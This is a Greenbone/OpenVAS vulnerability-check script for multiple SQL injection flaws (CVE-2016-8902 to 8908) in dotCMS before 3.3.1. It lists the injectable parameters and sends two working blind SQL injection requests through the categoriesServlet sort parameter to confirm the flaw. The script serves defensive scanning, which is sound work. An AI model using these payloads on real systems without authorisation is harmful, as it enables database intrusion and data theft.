CPE = "cpe:/a:dotcms:dotcms";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106364" );
	script_version( "$Revision: 12313 $" );
	script_tag( name: "last_modification", value: "$Date: 2018-11-12 09:53:51 +0100 (Mon, 12 Nov 2018) $" );
	script_tag( name: "creation_date", value: "2016-11-02 09:37:45 +0700 (Wed, 02 Nov 2016)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2016-8902", "CVE-2016-8903", "CVE-2016-8904", "CVE-2016-8905", "CVE-2016-8906", "CVE-2016-8907", "CVE-2016-8908" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "dotCMS Multiple SQL Injection Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "This script is Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_dotcms_detect.sc" );
	script_mandatory_keys( "dotCMS/installed" );
	script_tag( name: "summary", value: "dotCMS is prone to multiple SQL injection vulnerabilities." );
	script_tag( name: "vuldetect", value: "Tries to perform an unauthenticated partly blind SQL injection and checks
the response." );
	script_tag( name: "insight", value: "dotCMS is prone to multiple SQL injection vulnerabilities:

  - SQL injection vulnerability in the categoriesServlet allows remote not authenticated attackers to execute
arbitrary SQL commands via the sort parameter. (CVE-2016-8902)

  - SQL injection vulnerability in the 'Site Browser > Templates pages' screen allows remote authenticated
attackers to execute arbitrary SQL commands via the _EXT_13_orderby parameter. (CVE-2016-8903)

  - SQL injection vulnerability in the 'Site Browser > Containers pages' screen allows remote authenticated
attackers to execute arbitrary SQL commands via the _EXT_12_orderby parameter. (CVE-2016-8904)

  - SQL injection vulnerability in the JSONTags servlet allows remote authenticated attackers to execute
arbitrary SQL commands via the sort parameter. (CVE-2016-8905)

  - SQL injection vulnerability in the 'Site Browser > Links page' screen allows remote authenticated attackers
to execute arbitrary SQL commands via the _EXT_18_orderby parameter. (CVE-2016-8906)

  - SQL injection vulnerability in the 'Content Types > Content Types' screen allows remote authenticated attackers
to execute arbitrary SQL commands via the _EXT_STRUCTURE_orderBy and _EXT_STRUCTURE_direction parameters.
(CVE-2016-8907)

  - SQL injection vulnerability in the 'Site Browser > HTML pages' screen allows remote authenticated attackers
to execute arbitrary SQL commands via the _EXT_15_orderby parameter. (CVE-2016-8908)" );
	script_tag( name: "impact", value: "An attacker may execute arbitrary SQL commands." );
	script_tag( name: "affected", value: "dotCMS before 3.3.1" );
	script_tag( name: "solution", value: "Update to dotCMS 3.3.1 or later." );
	script_xref( name: "URL", value: "https://security.elarlang.eu/multiple-sql-injection-vulnerabilities-in-dotcms-8x-cve-full-disclosure.html" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/categoriesServlet?start=0&count=10&sort=keywords%20LIMIT%20(SELECT%20CASE%20WHEN%20(1=1)%20THEN%201%20ELSE%20-1%20END)--";
req = http_get( port: port, item: url );
res = http_keepalive_send_recv( port: port, data: req );
if(!ContainsString( res, "{\"numRows\":0,\"items\":[]}" )){
	exit( 0 );
}
url = dir + "/categoriesServlet?start=0&count=10&sort=keywords%20LIMIT%20(SELECT%20CASE%20WHEN%20(1=0)%20THEN%201%20ELSE%20-1%20END)--";
req = http_get( port: port, item: url );
res = http_keepalive_send_recv( port: port, data: req );
if(ContainsString( res, "Content-Length: 0" )){
	security_message( port: port );
	exit( 0 );
}
exit( 0 );

